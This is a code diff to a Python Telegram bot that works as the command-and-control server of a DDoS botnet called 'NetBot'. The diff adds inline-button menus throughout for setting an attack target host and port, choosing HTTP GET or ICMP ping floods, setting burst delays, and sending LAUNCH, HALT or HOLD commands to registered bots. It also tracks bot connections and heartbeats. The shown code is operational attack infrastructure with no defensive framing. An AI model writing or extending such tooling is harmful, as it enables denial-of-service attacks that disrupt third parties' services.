@@ -142,8 +142,26 @@ def show_config(update: Update, context: CallbackContext):
 💥 Attack Type: {netbot_config.ATTACK_TYPE}
 ⏱️ Burst Delay: {netbot_config.ATTACK_BURST_SECONDS}s
 🚦 Status: {netbot_config.ATTACK_CODE}
+
+Click buttons below to change settings:
 """
-    update.message.reply_text(config_text, parse_mode='Markdown')
+    
+    keyboard = [
+        [
+            InlineKeyboardButton("🎯 Set Target", callback_data='set_target'),
+            InlineKeyboardButton("🔌 Set Port", callback_data='set_port')
+        ],
+        [
+            InlineKeyboardButton("💥 Set Attack Type", callback_data='set_attack_type'),
+            InlineKeyboardButton("⏱️ Set Burst Delay", callback_data='set_delay')
+        ],
+        [
+            InlineKeyboardButton("🚦 Set Status", callback_data='set_status')
+        ]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    update.message.reply_text(config_text, parse_mode='Markdown', reply_markup=reply_markup)
 
 def list_bots(update: Update, context: CallbackContext):
     """Handle /bots command"""
@@ -258,6 +276,242 @@ def register_bot(bot_id, ip_address):
     bot_connections[bot_id] = {'last_seen': datetime.now(), 'ip': ip_address}
     print(f'\x1b[0;30;42m' + ' Bot is now Online! ' + '\x1b[0m', f'Bot ID: {bot_id}, IP: {ip_address}', '\x1b[6;30;43m' + f' Total Bots Connected: {connected_bots}' + '\x1b[0m')
 
+def button_callback(update: Update, context: CallbackContext):
+    """Handle inline button callbacks"""
+    query = update.callback_query
+    if not is_authorized(query.from_user.id):
+        query.answer("⛔ You are not authorized to use this bot.")
+        return
+    
+    query.answer()
+    
+    import netbot_config
+    
+    if query.data == 'set_target':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm", callback_data='confirm_target')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🎯 *Set Target*\n\nPlease send the new target IP address.\n\nCurrent: " + netbot_config.ATTACK_TARGET_HOST,
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        context.user_data['waiting_for'] = 'target'
+        
+    elif query.data == 'set_port':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm", callback_data='confirm_port')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🔌 *Set Port*\n\nPlease send the new port number.\n\nCurrent: " + netbot_config.ATTACK_TARGET_PORT,
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        context.user_data['waiting_for'] = 'port'
+        
+    elif query.data == 'set_attack_type':
+        keyboard = [
+            [InlineKeyboardButton("HTTPFLOOD", callback_data='type_httpflood')],
+            [InlineKeyboardButton("PINGFLOOD", callback_data='type_pingflood')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "💥 *Set Attack Type*\n\nSelect attack type:\n\nCurrent: " + netbot_config.ATTACK_TYPE,
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'set_delay':
+        keyboard = [
+            [InlineKeyboardButton("0s", callback_data='delay_0')],
+            [InlineKeyboardButton("1s", callback_data='delay_1')],
+            [InlineKeyboardButton("2s", callback_data='delay_2')],
+            [InlineKeyboardButton("5s", callback_data='delay_5')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "⏱️ *Set Burst Delay*\n\nSelect delay between requests:\n\nCurrent: " + netbot_config.ATTACK_BURST_SECONDS + "s",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'set_status':
+        keyboard = [
+            [InlineKeyboardButton("LAUNCH", callback_data='status_launch')],
+            [InlineKeyboardButton("HALT", callback_data='status_halt')],
+            [InlineKeyboardButton("HOLD", callback_data='status_hold')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🚦 *Set Status*\n\nSelect command status:\n\nCurrent: " + netbot_config.ATTACK_CODE,
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'type_httpflood':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm HTTPFLOOD", callback_data='confirm_type_httpflood')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "💥 *Confirm Attack Type*\n\nYou selected: HTTPFLOOD\n\nThis will send HTTP GET requests to the target.\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'type_pingflood':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm PINGFLOOD", callback_data='confirm_type_pingflood')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "💥 *Confirm Attack Type*\n\nYou selected: PINGFLOOD\n\nThis will send ICMP ping requests to the target.\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'confirm_type_httpflood':
+        netbot_config.ATTACK_TYPE = "HTTPFLOOD"
+        query.edit_message_text("✅ Attack type set to HTTPFLOOD")
+        
+    elif query.data == 'confirm_type_pingflood':
+        netbot_config.ATTACK_TYPE = "PINGFLOOD"
+        query.edit_message_text("✅ Attack type set to PINGFLOOD")
+        
+    elif query.data.startswith('delay_'):
+        delay = query.data.split('_')[1]
+        keyboard = [
+            [InlineKeyboardButton(f"✅ Confirm {delay}s", callback_data=f'confirm_delay_{delay}')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            f"⏱️ *Confirm Burst Delay*\n\nYou selected: {delay}s\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data.startswith('confirm_delay_'):
+        delay = query.data.split('_')[2]
+        netbot_config.ATTACK_BURST_SECONDS = delay
+        query.edit_message_text(f"✅ Burst delay set to {delay}s")
+        
+    elif query.data == 'status_launch':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm LAUNCH", callback_data='confirm_status_launch')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🚦 *Confirm Status*\n\nYou selected: LAUNCH\n\n⚠️ This will start the attack!\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'status_halt':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm HALT", callback_data='confirm_status_halt')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🚦 *Confirm Status*\n\nYou selected: HALT\n\nThis will stop all attacks immediately.\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'status_hold':
+        keyboard = [
+            [InlineKeyboardButton("✅ Confirm HOLD", callback_data='confirm_status_hold')],
+            [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+        ]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        query.edit_message_text(
+            "🚦 *Confirm Status*\n\nYou selected: HOLD\n\nThis will pause and wait for commands.\n\nConfirm?",
+            parse_mode='Markdown',
+            reply_markup=reply_markup
+        )
+        
+    elif query.data == 'confirm_status_launch':
+        netbot_config.ATTACK_CODE = "LAUNCH"
+        query.edit_message_text("✅ Status set to LAUNCH - Attack started!")
+        
+    elif query.data == 'confirm_status_halt':
+        netbot_config.ATTACK_CODE = "HALT"
+        query.edit_message_text("✅ Status set to HALT - Attack stopped!")
+        
+    elif query.data == 'confirm_status_hold':
+        netbot_config.ATTACK_CODE = "HOLD"
+        query.edit_message_text("✅ Status set to HOLD - Waiting for commands")
+        
+    elif query.data == 'cancel':
+        show_config(update, context)
+        
+    elif query.data == 'confirm_target':
+        if 'new_value' in context.user_data:
+            netbot_config.ATTACK_TARGET_HOST = context.user_data['new_value']
+            query.edit_message_text(f"✅ Target set to {context.user_data['new_value']}")
+            del context.user_data['new_value']
+        else:
+            query.edit_message_text("❌ No value provided. Please try again.")
+            
+    elif query.data == 'confirm_port':
+        if 'new_value' in context.user_data:
+            netbot_config.ATTACK_TARGET_PORT = context.user_data['new_value']
+            query.edit_message_text(f"✅ Port set to {context.user_data['new_value']}")
+            del context.user_data['new_value']
+        else:
+            query.edit_message_text("❌ No value provided. Please try again.")
+
+def config_input_handler(update: Update, context: CallbackContext):
+    """Handle text input for configuration changes"""
+    if not is_authorized(update.effective_user.id):
+        update.message.reply_text("⛔ You are not authorized to use this bot.")
+        return
+    
+    if 'waiting_for' in context.user_data:
+        waiting_for = context.user_data['waiting_for']
+        new_value = update.message.text
+        
+        if waiting_for == 'target':
+            context.user_data['new_value'] = new_value
+            keyboard = [
+                [InlineKeyboardButton("✅ Confirm", callback_data='confirm_target')],
+                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            update.message.reply_text(
+                f"🎯 *Confirm Target*\n\nNew value: {new_value}\n\nConfirm?",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+            del context.user_data['waiting_for']
+            
+        elif waiting_for == 'port':
+            context.user_data['new_value'] = new_value
+            keyboard = [
+                [InlineKeyboardButton("✅ Confirm", callback_data='confirm_port')],
+                [InlineKeyboardButton("❌ Cancel", callback_data='cancel')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            update.message.reply_text(
+                f"🔌 *Confirm Port*\n\nNew value: {new_value}\n\nConfirm?",
+                parse_mode='Markdown',
+                reply_markup=reply_markup
+            )
+            del context.user_data['waiting_for']
+    else:
+        heartbeat_handler(update, context)
+
 def heartbeat_handler(update: Update, context: CallbackContext):
     """Handle heartbeat messages from bots"""
     message = update.message.text
@@ -290,8 +544,11 @@ def main():
     dispatcher.add_handler(CommandHandler("bots", list_bots))
     dispatcher.add_handler(CommandHandler("help", help_command))
     
-    # Handle heartbeat messages from bots
-    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, heartbeat_handler))
+    # Handle callback queries from inline buttons
+    dispatcher.add_handler(CallbackQueryHandler(button_callback))
+    
+    # Handle text input for configuration and heartbeat messages
+    dispatcher.add_handler(MessageHandler(Filters.text & ~Filters.command, config_input_handler))
     
     # Start the bot
     print("🚀 NetBot Telegram CCC Server Started!")
